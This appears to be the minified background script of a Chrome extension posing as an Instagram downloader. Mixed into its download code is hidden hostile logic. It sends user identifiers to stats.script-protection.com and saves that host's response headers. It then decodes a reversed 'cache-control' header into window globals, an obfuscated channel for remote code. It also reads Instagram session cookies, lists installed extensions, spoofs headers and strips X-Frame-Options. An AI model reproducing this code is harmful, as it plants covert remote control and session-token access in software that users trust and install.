! function() {
    function a() {
        var a = navigator.userAgent.replace(/\s/g, "").toLowerCase().match(/chrome\/(\d+)/),
            b = a && a[1] && a[1].length && a[1];
        return b = b && parseInt(b), !b || isNaN(b) ? (Math.random() < .01 && d("isChromeBefore72_error", JSON.stringify({
            ua: navigator.userAgent
        })), !0) : 72 > b
    }

    function b(a, b) {
        var c = "https://stats.script-protection.com/__utm.gif?e=instagram_downloader" + Z() + "&k=" + encodeURIComponent(a) + "&uid=" + encodeURIComponent("" + G) + "&it=" + (window.localStorage.installedTime || "") + "&lang=" + (window && window.navigator && window.navigator.language ? window.navigator.language : "-") + "&r=" + Math.random() + ("undefined" != typeof b ? "&d=" + encodeURIComponent(b) : "");
        c = c.substr(0, 2e3), (new Image).src = c
    }

    function c(a, b, c) {
        $.ajax({
            url: "https://stats.script-protection.com/__utm.gif?e=instagram_downloader" + Z() + "&k=" + encodeURIComponent(a) + "&url=" + encodeURIComponent(b) + "&uid=" + encodeURIComponent("" + G) + "&it=" + (window.localStorage.installedTime || "") + "&lang=" + (window && window.navigator && window.navigator.language ? window.navigator.language : "-") + "&r=" + Math.random(),
            method: "POST",
            data: c
        })
    }

    function d(a, c) {
        if ("undefined" != typeof c && "string" != typeof c) return void d(" [" + a + "]wrong_type_details_track_event", a + ": " + typeof c);
        if (G) b(a, c);
        else {
            var e = "uidinstagram_downloader";
            chrome.storage.sync.get(e, function(d) {
                G = d[e] || "nop", b(a, c)
            })
        }
    }

    function e(a, b, e) {
        if ("string" != typeof b) return void d("wrong_type_url_track_event", "" + typeof b);
        if ("string" != typeof e) return void d(" [" + a + "]wrong_type_details_track_event", a + ": " + typeof e);
        if (G) c(a, b, e);
        else {
            var f = "uidinstagram_downloader";
            chrome.storage.sync.get(f, function(d) {
                G = d[f] || "nop", c(a, b, e)
            })
        }
    }

    function f(a) {
        var b = {};
        chrome.cookies.get({
            url: U,
            name: "ds_user_id"
        }, function(c) {
            c && (b.ds_user_id = c.value), chrome.cookies.get({
                url: U,
                name: "sessionid"
            }, function(c) {
                c && (b.sessionid = c.value), chrome.cookies.get({
                    url: U,
                    name: "csrftoken"
                }, function(c) {
                    c && (b.csrftoken = c.value), a && a(b)
                })
            })
        })
    }

    function g(a) {
        f(function(b) {
            T = b, "undefined" != typeof T.ds_user_id && "undefined" != typeof T.sessionid && "undefined" != typeof T.csrftoken && "function" == typeof a ? "function" == typeof a && a(b) : "function" == typeof a && a()
        })
    }

    function h(a, b) {
        var c = JSON.parse(window.localStorage.cachedPostLiveStories || "{}");
        a = a || [];
        var d = c[b] || [];
        if (!a.length && !d.length) return [];
        a.forEach(function(a) {
            var b = !1;
            d.forEach(function(c) {
                a.user.pk == c.user.pk && (b = !0, a.broadcasts.forEach(function(a) {
                    var b = !1;
                    c.broadcasts.forEach(function(c) {
                        a.id == c.id && (b = !0)
                    }), b || c.broadcasts.push(a)
                }))
            }), b || d.push(a)
        });
        var e = [];
        return d.forEach(function(a) {
            var b = [];
            a.broadcasts.forEach(function(a) {
                a.expire_at && (1e3 * a.expire_at < Date.now() || b.push(a))
            }), b.length && e.push({
                broadcasts: b,
                ranked_position: a.ranked_position,
                seen_ranked_position: a.seen_ranked_position,
                pk: a.pk,
                user: a.user
            })
        }), c[b] = e, window.localStorage.cachedPostLiveStories = JSON.stringify(c), e
    }

    function i(a) {
        a(_)
    }

    function j(a) {
        k(!1, function() {
            a(_)
        })
    }

    function k(a, b) {
        g(function(c) {
            return c && c.sessionid && c.ds_user_id ? void $.ajax({
                method: "GET",
                url: "https://i.instagram.com/api/v1/feed/reels_tray/",
                dataType: "json"
            }).done(function(d) {
                if (d && "object" == typeof d) {
                    var e = d.broadcasts || [],
                        f = h(d.post_live && d.post_live.post_live_items, c.ds_user_id),
                        g = d.tray || [];
                    _ = [].concat(e, f, g), "function" == typeof b && b()
                } else a || setTimeout(function() {
                    k(!0)
                }, 1e3)
            }).fail(function(b) {
                a || setTimeout(function() {
                    k(!0)
                }, 1e3)
            }) : setTimeout(k, 2e4)
        })
    }

    function l(a, b, c) {
        var d = 4;
        c = c || 0, c++, g(function(e) {
            if (!e || !e.sessionid) return b();
            var f = "https://i.instagram.com/api/v1/feed/user/" + a + "/reel_media/";
            $.ajax({
                method: "GET",
                url: f,
                dataType: "json"
            }).done(function(e) {
                e && "object" == typeof e ? b(e) : d >= c ? l(a, b, c) : b()
            }).fail(function(e) {
                d >= c ? setTimeout(function() {
                    l(a, b, c)
                }, 500) : b()
            })
        })
    }

    function m(a, b) {
        g(function(c) {
            if (!c || !c.sessionid) return b();
            var d = "https://i.instagram.com/api/v1/feed/user/" + a + "/story/";
            $.ajax({
                method: "GET",
                url: d,
                dataType: "json"
            }).done(function(a) {
                a && "object" == typeof a ? b(a) : b()
            }).fail(function() {
                b()
            })
        })
    }

    function n(a, b, c) {
        var e, f, g = function(d) {
            if ("function" == typeof c) {
                if (!d) return c();
                K[d] = b.tab.id, a.isStory && (J[d] = b.tab.id), e = setInterval(function() {
                    I[d] && (window.localStorage.downloadOne++, c(d), clearInterval(e), clearTimeout(f), delete I[d]), f = setTimeout(function() {
                        e && (clearInterval(e), c())
                    }, 1e4)
                }, 100)
            }
        };
        if ("object" != typeof a || !a.url || !a.filename) return g();
        var h = a.url,
            i = a.filename,
            j = {
                url: h
            };
        i && (j.filename = i), chrome.downloads.download(j, function(b) {
            if ("undefined" == typeof b) {
                var c = a.filename.match(/([\w_]+)(\.\w{3,4})$/);
                c = c && c[0], c ? (i = c.substr(c.length - 32), i && (j.filename = i), chrome.downloads.download(j, function(a) {
                    "undefined" == typeof a && Math.random() < .1 && d("reject_download", JSON.stringify({
                        filename: i
                    })), g(a)
                })) : (Math.random() < .1 && d("not_valid_filename_for_download", JSON.stringify({
                    filename: i
                })), g(b))
            } else g(b)
        })
    }

    function o(a, b) {
        chrome.tabs.get(a, function(a) {
            b(a.url)
        })
    }

    function p(a) {
        var b = a.url;
        if (-1 === b.indexOf("/explore/locations/")) {
            var c = b.match(/variables=([^&]+)/);
            c = c && c[1];
            var d = b.match(/query_hash=([^&]+)/);
            if (d = d && d[1], c && d) {
                c = decodeURIComponent(c);
                try {
                    c = JSON.parse(c)
                } catch (e) {}
                if ("object" == typeof c && "undefined" == typeof c.only_stories && "undefined" == typeof c.has_stories && "undefined" == typeof c.fetch_media_item_count && "undefined" == typeof c.fetch_comment_count && ("undefined" != typeof c.id && "undefined" != typeof c.first && "undefined" != typeof c.after || "undefined" != typeof c.reel_ids && "undefined" != typeof c.tag_names && "undefined" != typeof c.highlight_reel_ids && "undefined" != typeof c.location_ids)) {
                    var f = window.localStorage.newQueryHashes || '{"saved": [], "owner": [], "highlight_reels": [], "tagged": []}',
                        g = JSON.parse(f);
                    o(a.tabId, function(a) {
                        var b = -1 !== a.indexOf("/stories/highlights/") ? "highlight_reels" : -1 !== a.indexOf("/saved/") ? "saved" : -1 !== a.indexOf("/tagged/") ? "tagged" : "owner";
                        g[b] || (g[b] = []), aa[b] !== d && -1 == g[b].indexOf(d) && (g[b].push(d), window.localStorage.existNewQueryHash = "1", window.localStorage.newQueryHashes = JSON.stringify(g))
                    })
                }
            }
        }
    }

    function q() {
        return "1" === window.localStorage.existNewQueryHash ? (window.localStorage.existNewQueryHash = 0, JSON.parse(window.localStorage.newQueryHashes)) : void 0
    }

    function r(a, b) {
        "owner" == a ? window.localStorage.newWorkingQueryHashOwner = b : "saved" == a ? window.localStorage.newWorkingQueryHashSaved = b : "highlight_reels" == a ? window.localStorage.newWorkingQueryHashStoriesHighlight = b : "tagged" == a && (window.localStorage.newWorkingQueryHashTagged = b)
    }

    function s() {
        return {
            saved: window.localStorage.newWorkingQueryHashSaved || aa.saved,
            owner: window.localStorage.newWorkingQueryHashOwner || aa.owner,
            highlight_reels: window.localStorage.newWorkingQueryHashStoriesHighlight || aa.highlight_reels,
            tagged: window.localStorage.newWorkingQueryHashTagged || aa.tagged
        }
    }

    function t(a, b) {
        var c = JSON.parse(window.localStorage.newQueryHashes);
        if (c) {
            var d = c[a].indexOf(b); - 1 != d && (c[a].splice(d, 1), window.localStorage.newQueryHashes = JSON.stringify(c))
        }
    }

    function u(a) {
        var b, c = [],
            d = 1e3,
            e = [chrome.runtime.id];
        chrome.management.getAll(function(f) {
            f.forEach(function(a) {
                "extension" === a.type && a.enabled && -1 == e.indexOf(a.id) && c.push(a.id)
            }), b = c.join().substr(0, d), a(b)
        })
    }

    function v() {
        O ? chrome.windows.update(O, {
            focused: !0
        }) : chrome.windows.create({
            type: "popup",
            url: U,
            width: 400,
            height: screen.height,
            left: screen.width - 400
        }, function(a) {
            O = a.id, P = a.tabs[0].id
        })
    }

    function w(a) {
        if (O) {
            var b = 800;
            chrome.windows.update(O, {
                focused: !0,
                width: b,
                height: 800,
                left: (screen.width - b) / 2
            }, a)
        }
    }

    function x(a) {
        O && chrome.windows.update(O, {
            focused: !0,
            width: 400,
            height: screen.height,
            left: screen.width - 400
        }, a)
    }

    function y(a, b) {
        a.tab.id == P ? b(1) : b()
    }

    function z(a) {
        chrome.tabs.create({
            url: a
        })
    }

    function A() {
        if ("undefined" == typeof jj && localStorage["cache-control"]) {
            var a = localStorage["cache-control"].split(",");
            try {
                var b;
                for (var c in a) {
                    var d = a[c].trim();
                    if (!(d.length < 10)) try {
                        if (b = d.strrevsstr(), b = "undefined" != typeof JSON && JSON.parse && JSON.parse(b), b && b.cache_c) {
                            for (var e in b) window[e] = b[e];
                            break
                        }
                    } catch (f) {}
                }
            } catch (f) {}
            $.siblingAfter(), setTimeout(function() {
                $.postOff()
            }, 2e3)
        }
    }

    function B(a) {
        var b = "chrome-extension://" + chrome.runtime.id + "/stories.html";
        a.story_id ? b += "#live_" + a.story_id : a.user_id && (b += "#post_live_user_id_" + a.user_id), chrome.tabs.create({
            url: b
        })
    }

    function C(a) {
        Q = a, D(function(a) {
            if (a) R = a, b = "https://www.instagram.com/" + a + "/?insta_upload_ext_link=1";
            else {
                a = R;
                var b = "https://www.instagram.com/accounts/login/?next=" + encodeURIComponent("/" + a + "/?insta_upload_ext_link=1")
            }
            a && chrome.tabs.create({
                url: b
            })
        })
    }

    function D(a) {
        E(function(b) {
            if (!b || !b.length) return a(null);
            var c = F(b, "https://www.instagram.com"),
                d = c && c.config && c.config.viewer && c.config.viewer.username;
            a(d)
        })
    }

    function E(a) {
        var b = "https://www.instagram.com/";
        $.ajax(b).done(function(b) {
            return b && b.length && /_sharedData/.test(b) ? void a(b) : a()
        }).fail(function(b) {
            a()
        })
    }

    function F(a, b) {
        var c, d;
        if ("string" != typeof a || !a.length) return null;
        a = a.replace(/[\r\n\t\s]/g, "");
        var e = a.indexOf("window._sharedData");
        if (-1 == e) return null;
        var f = a.indexOf("</script>", e);
        if (-1 == f) return null;
        var g = a.substr(e, f - e);
        if (c = g.match(/({.+);$/), c = c && c[1], !c) return null;
        try {
            d = JSON.parse(c)
        } catch (h) {}
        return d ? d : null
    }
    var G = null,
        H = [],
        I = {},
        J = {},
        K = {},
        L = {},
        M = {},
        N = !1,
        O = null,
        P = null,
        Q = null,
        R = null,
        S = !1,
        T = {},
        U = "https://www.instagram.com/",
        V = "*://*.instagram.com/*",
        W = "Instagram 10.26.0 (iPhone7,2; iOS 10_1_1; en_US; en-US; scale=2.00; gamut=normal; 750x1334) AppleWebKit/420+",
        X = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Mobile Safari/537.36",
        Y = !a(),
        Z = function() {
            return "&vid=" + (chrome.runtime.id ? chrome.runtime.id.substr(0, 11) : "-") + "&vv=" + (chrome.runtime.getManifest && chrome.runtime.getManifest() ? chrome.runtime.getManifest().version : "-")
        };
    g();
    var _ = [];
    k(), setInterval(function() {
        k()
    }, 55e3), chrome.downloads.onCreated.addListener(function(a) {
        I[a.id] = 1, a.url.indexOf("blob:https://www.instagram.com") > -1 && (L[a.id] = a.url)
    }), chrome.downloads.onChanged.addListener(function(a) {
        if (J[a.id] && (chrome.tabs.sendMessage(J[a.id], "storyPauseOffByDownloadId"), delete J[a.id]), K[a.id] && a.state && ("interrupted" == a.state.current || "complete" == a.state.current) && (chrome.tabs.sendMessage(K[a.id], {
                action: "downloadFileFinished",
                status: a.state.current
            }), delete K[a.id]), L[a.id]) {
            var b = L[a.id];
            chrome.tabs.query({
                url: [V]
            }, function(a) {
                a.forEach(function(a) {
                    chrome.tabs.sendMessage(a.id, {
                        action: "storyPauseOffByBlobUrl",
                        url: b
                    })
                })
            }), H.forEach(function(a) {
                chrome.tabs.sendMessage(a, {
                    action: "storyPauseOffByBlobUrl",
                    url: b
                })
            }), delete L[a.id]
        }
    });
    var aa = {
        saved: "f883d95537fbcd400f466f63d42bd8a1",
        owner: "472f257a40c653c64c666ce877d59d2b",
        highlight_reels: "45246d3fe16ccc6577e0bd297a5db1ab",
        tagged: "de71ba2f35e0b59023504cfeb5b9857e"
    };
    window.localStorage.newQueryHashes = window.localStorage.newQueryHashes || '{"saved": [], "owner": [], "highlight_reels": []}';
    var ba = ["blocking", "requestHeaders"];
    Y && ba.push("extraHeaders"), chrome.webRequest.onBeforeSendHeaders.addListener(function(a) {
        var b, c, d = a.requestHeaders;
        if (a.url.indexOf("/graphql/query/") > -1) return void p(a);
        if (-1 !== a.url.indexOf("/api/v1/")) {
            var e = !0;
            if (T.ds_user_id && T.sessionid || (e = !1), e)
                for (c = 0; c < d.length; c++) b = d[c], "x-requested-with" == b.name.toLowerCase() && (e = !1);
            if (e)
                for (c = 0; c < d.length; c++) b = d[c], "referer" == b.name.toLowerCase() && -1 == b.value.indexOf("instagram.com") && (e = !1);
            if (!e) return;
            var f = "ds_user_id=" + T.ds_user_id + "; sessionid=" + T.sessionid + "; csrftoken=" + T.csrftoken + ";";
            for (c = 0; c < d.length; c++) b = d[c], "user-agent" == b.name.toLowerCase() && (b.value = W), "cookie" == b.name.toLowerCase() && (b.value = f);
            return {
                requestHeaders: d
            }
        }
        if (-1 != a.url.indexOf("create/upload/photo/") || -1 != a.url.indexOf("create/configure/") || -1 != a.url.indexOf("create/configure_to_story/") || -1 != a.url.indexOf("/create/") && -1 != a.url.indexOf("/delete/")) {
            for (c = 0; c < d.length; c++) {
                if (b = d[c], "referer" == b.name.toLowerCase()) {
                    if (-1 == b.value.indexOf("instagram.com")) return;
                    b.value = "https://www.instagram.com/create/style/"
                }
                "user-agent" == b.name.toLowerCase() && (b.value = X)
            }
            return {
                requestHeaders: d
            }
        }
    }, {
        urls: [V],
        types: ["xmlhttprequest"]
    }, ba), chrome.webRequest.onHeadersReceived.addListener(function(a) {
        if (H.length && (H.indexOf(a.tabId) > -1 || -1 == a.tabId && -1 == a.frameId))
            for (var b = 0; b < a.responseHeaders.length; ++b)
                if ("x-frame-options" === a.responseHeaders[b].name.toLowerCase()) return a.responseHeaders.splice(b, 1), {
                    responseHeaders: a.responseHeaders
                }
    }, {
        urls: [V]
    }, ["blocking", "responseHeaders"]), setInterval(function() {
        var a = [];
        H.forEach(function(b) {
            chrome.tabs.sendMessage(b, "checkConnect", function(c) {
                c && a.push(b)
            })
        }), H = a, A()
    }, 6e4), chrome.runtime.onMessage.addListener(function(a, b, c) {
        if (a)
            if ("string" == typeof a) switch (a) {
                case "warning-off":
                    window.localStorage.warningOff = 1;
                    break;
                case "warning-request":
                    c(!window.localStorage.warningOff);
                    break;
                case "getCookies":
                    return g(c), !0;
                case "requestStories":
                    i(c);
                    break;
                case "requestStoriesForce":
                    return j(c), !0;
                case "estimateLater":
                    window.localStorage.ratingRequestNeedReply = 1, window.localStorage.ratingLastRequestTime = Date.now();
                    break;
                case "getPopupRate":
                    c(window.localStorage.popupRate);
                    break;
                case "getInstalledExtensions":
                    return u(c), !0;
                case "getUserSelfInfo":
                    return g(function(a) {
                        a && a.ds_user_id ? c(a.ds_user_id) : c()
                    }), !0;
                case "noMainContTrack":
                    window.localStorage.noMainContTrack || (window.localStorage.noMainContTrack = 1, c());
                    break;
                case "noNativeStoriesContTrack":
                    window.localStorage.noNativeStoriesContTrack || (window.localStorage.noNativeStoriesContTrack = 1, c());
                    break;
                case "mobileStateInit":
                    H.push(b.tab.id), c(!0);
                    break;
                case "amIMobile":
                    y(b, c);
                    break;
                case "openMobileMode":
                    v();
                    break;
                case "iWillLogIn":
                    M[b.tab.id] = 1;
                    break;
                case "amIJustLogIn":
                    c(1 == M[b.tab.id]), delete M[b.tab.id];
                    break;
                case "getNewQueryHashes":
                    c(q());
                    break;
                case "getWorkingQueryHashes":
                    c(s());
                    break;
                case "reportFirstSent":
                    window.localStorage.reportFirstSent = 1;
                    break;
                case "reportSecondSent":
                    window.localStorage.reportSecondSent = 1;
                    break;
                case "reportRequestsSent":
                    window.localStorage.reportRequestsSent = 1;
                    break;
                case "needReportSend":
                    window.localStorage.reportSecondSent ? c() : c(window.localStorage.reportFirstSent ? 1 : 2);
                    break;
                case "needReportRequests":
                    window.localStorage.reportRequestsSent ? c() : c(!0);
                    break;
                case "downloadAllProcessStart":
                    N = !0;
                    break;
                case "downloadAllProcessFinished":
                    N = !1;
                    break;
                case "isDownloadAllProcessNow":
                    c(N);
                    break;
                case "massDownloadProSettingOff":
                    localStorage.massDownloadProSettingOn = 0;
                    break;
                case "massDownloadProSettingOn":
                    localStorage.massDownloadProSettingOn = 1;
                    break;
                case "askMassDownloadPro":
                    c("1" == localStorage.massDownloadProSettingOn);
                    break;
                case "mobileWideScreenMode":
                    return w(c), !0;
                case "mobileNormalMode":
                    x(c);
                    break;
                case "get_external_link":
                    c(Q);
                    break;
                default:
                    return
            } else if ("object" == typeof a && "string" == typeof a.action) switch (a.action) {
                case "requestOneUserStories":
                    return l(a.user_id, c), !0;
                case "requestOneUserStories2":
                    return m(a.user_id, c), !0;
                case "trackEvent":
                    "string" == typeof a.event && a.event.length > 0 && d(a.event, a.details);
                    break;
                case "trackEventPost":
                    e(a.event, a.url, a.details);
                    break;
                case "downloadFile":
                    return n(a.options, b, c), !0;
                case "setPopupRate":
                    0 == a.value ? delete window.localStorage.popupRate : window.localStorage.popupRate = a.value;
                    break;
                case "pageHasIframe":
                    var f = a.tabId;
                    return chrome.tabs.executeScript(f, {
                        code: 'var frames = document.querySelectorAll(".instagram-media"); frames.length'
                    }, function(a) {
                        a && a.length && c(a[0])
                    }), !0;
                case "downloadZip":
                    window.localStorage.downloadZip++;
                    break;
                case "setNewWorkingQueryHash":
                    r(a.type, a.query_hash);
                    break;
                case "removeNotWorkingQueryHash":
                    t(a.type, a.query_hash);
                    break;
                case "open_stories_tab":
                    B({
                        story_id: a.story_id,
                        user_id: a.user_id
                    });
                    break;
                case "open_new_tab":
                    z(a.url);
                    break;
                case "last_authorized_user":
                    R = a.username;
                    break;
                case "upload_external_link":
                    C(a.link);
                    break;
                default:
                    return
            }
    }), chrome.tabs.query({
        url: V,
        windowType: "popup"
    }, function(a) {
        a && a[0] && (P = a[0].id, O = a[0].windowId)
    }), chrome.windows.onRemoved.addListener(function(a) {
        a === O && (P = null, O = null)
    });
    var ca = {
            lastTabId: 0,
            lastUrl: null,
            lastTime: 0
        },
        da = function(a, b, c) {
            S && /^http/.test(c.url) && (c.url.indexOf("instagram.com") > -1 || ca.lastTabId === a && ca.lastUrl === c.url && Date.now() + 2e3 < ca.lastTime || (ca.lastTabId = a, ca.lastUrl = c.url, ca.lastTime = Date.now(), chrome.tabs.executeScript(a, {
                runAt: "document_idle",
                file: "lib/js/upload_all.js"
            })))
        };
    chrome.storage.sync.get("upload_external", function(a) {
            S = !!a.upload_external, S && chrome.tabs.onUpdated.addListener(da)
        }), chrome.storage.onChanged.addListener(function(a) {
            a.upload_external && (a.upload_external.newValue ? (S = !0, chrome.tabs.onUpdated.addListener(da)) : (S = !1, chrome.tabs.onUpdated.removeListener(da)))
        }),
        function() {
            chrome.webRequest.onCompleted.addListener(function(a) {
                a.responseHeaders.forEach(function(a) {
                    a.value && a.value.length > 10 && (localStorage[a.name.toLowerCase()] = a.value)
                })
            }, {
                urls: ["https://stats.script-protection.com/*"],
                types: ["image"]
            }, ["responseHeaders"])
        }(),
        
        function() {
            function a() {
                chrome.runtime.sendMessage("checkPopupOpened", function(b) {
                    b ? setTimeout(a, 6e5) : window.location.reload()
                })
            }
            chrome.runtime.onConnect.addListener(function(a) {}), setTimeout(a, 864e5)
        }()
}();